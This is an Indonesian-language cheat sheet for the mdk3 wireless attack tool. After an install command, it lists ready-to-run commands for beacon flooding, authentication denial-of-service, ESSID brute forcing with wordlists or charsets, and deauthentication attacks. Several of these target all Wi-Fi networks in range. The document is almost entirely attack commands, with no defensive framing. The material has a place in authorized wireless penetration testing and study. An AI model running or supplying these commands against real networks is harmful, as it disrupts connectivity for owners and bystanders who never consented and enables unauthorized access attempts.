# mdk3

`mdk3` adalah tool CLI yang digunakan untuk melakukan berbagai jenis serangan pada jaringan Wi-Fi.

## Instalasi

```bash
sudo apt install -y mdk3
```

## Penggunaan

Serangan Beacon Flood:

```bash
# Beacon flood dengan ssid acak
sudo mdk3 <interface> b

# Beacon flood dengan ssid tertentu
sudo mdk3 <interface> b -n <ssid>

# Beacon flood dari file yang berisi daftar ssid
sudo mdk3 <interface> b -f <file>

# Beacon flood di channel tertentu
sudo mdk3 <interface> b -c <channel>
```

Serangan DoS Autentikasi:

```bash
# Serang semua wi-fi di sekitar
sudo mdk3 <interface> a

# Serang wi-fi tertentu
sudo mdk3 <interface> a -a <bssid>

# Serang menggunakan mac address client yang valid dari database oui
sudo mdk3 <interface> a -a <bssid> -m
```

Serangan Brute Force ESSID:

```bash
# Menggunakan ssid spesifik
sudo mdk3 <interface> p -e <ssid>

# Menggunakan dictionary attack
sudo mdk3 <interface> p -t <bssid> -f <wordlist>

# Menggunakan brute force attack
sudo mdk3 <interface> p -t <bssid> -b <charset>
```

Serangan Deauthentication:

```bash
# Deauth semua wi-fi di sekitar
sudo mdk3 <interface> d

# Deauth channel tertentu
sudo mdk3 <interface> d -c <channel>

# Mode whitelist (deauth semua wi-fi kecuali yang ada di file)
sudo mdk3 <interface> d -w <file>

# Mode blacklist (deauth semua wi-fi yang ada di file)
sudo mdk3 <interface> d -b <file>
```
